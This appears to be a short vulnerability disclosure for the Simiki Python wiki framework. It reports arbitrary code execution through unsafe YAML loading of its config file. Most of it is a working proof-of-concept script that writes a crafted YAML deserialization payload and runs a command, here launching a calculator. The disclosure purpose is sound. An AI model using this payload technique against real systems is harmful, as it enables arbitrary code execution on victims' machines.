# Description

`Simiki` is a simple wiki framework, written in Python.  which is vulnerable to `Arbitrary Code Execution`.

# Vulnerability

Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept

### Installation
```bash
pip install simiki
```

### Run exploit.py
```
import os
#os.system('pip3 install simiki')
from simiki import config
payload = """cmd: !!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
open('config.yml','w+').write(payload)
config.parse_config('config.yml')
```
* `python3 exploit.py`

# Impact

Arbitary Code Execution
